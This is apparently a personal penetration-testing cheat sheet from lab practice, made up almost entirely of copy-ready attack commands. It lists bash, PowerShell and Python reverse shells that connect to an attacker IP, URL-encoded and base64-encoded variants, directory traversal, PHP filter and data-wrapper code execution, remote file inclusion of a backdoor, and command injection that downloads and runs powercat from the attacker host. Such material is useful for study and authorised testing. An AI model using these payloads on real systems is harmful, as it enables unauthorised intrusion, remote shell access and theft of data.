 - Logging in with ssh key
```ssh -i <keyname> -p 2222 <username>@website.com```

 - Error: Permissions 0644 for '/home/kali/key-name' are too open. 
 - Fix permissions this command
 ```chmod 400 <keyname> ```

- Directory traversal with URL encoding
```../ = %2e%2e/```

- Bash reverse shell
```
bash -c "bash -i >& /dev/tcp/192.168.45.227/4444 0>&1"
```
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
```

-  URL encoded bash reverse shell 
```
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

- Netcat listener for reverse shells
```nc -nlvp <port number>```

- Windows Directory traversal(need double slashes to escape)
```curl --path-as-is http://192.168.233.193/meteor/index.php?page=C:\\xampp\\apache\\logs\\access.log```

- PHP filter to get contents of a file
```curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php```

- Data filter for code execution
```curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-r');?>"```

- Python webserver in the directory of the file that is needed
```python3 -m http.server 80```

- Curl for RFI (webserver needs to be open in the directory that the file resides in)
```sh
curl "http://mountaindesserts.com/meteor/index.php?page=http://<my-ip-addr>/simple-backdoor.php$cmd=ls"
```

- Powershell reverse shell
```powershell
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.227",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# Get bytes
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

# Encode to base64
$EncodedText =[Convert]::ToBase64String($Bytes)
```

- curl execute powershell base64 encoded reverse shell one liner
```sh
curl http://192.168.233.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgB...
AoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\n
```

- Command Injection with parameter 
```sh
curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.233.189:8000/archive

```

- Check for Powershell or 'CMD' in command execution
```sh
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

# URL encoded with Curl
curl -X POST --data 'Archive=git%3B%28dir%202%3E%261%20%2A%60%7Cecho%20CMD%29%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell%0A' http://192.168.233.189:8000/archive

```

- Create powershell reverse shell with powercat.ps1
```sh
# powercat.ps1 
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .

# host python webserver
python3 -m http.server 80

# Powershell reverse shell 
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.227/powercat.ps1");powercat -c 192.168.45.227 -p 4444 -e powershell

# URL encoded with Curl
curl -X POST --data 'Archive=git%3BIEX%20%28New-Object%20System.Net.Webclient%29.DownloadString%28%22http%3A%2F%2F192.168.45.227%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.227%20-p%204444%20-e%20powershell' http://192.168.233.189:8000/archive
```

- Python Reverse shell
```sh
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.227",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

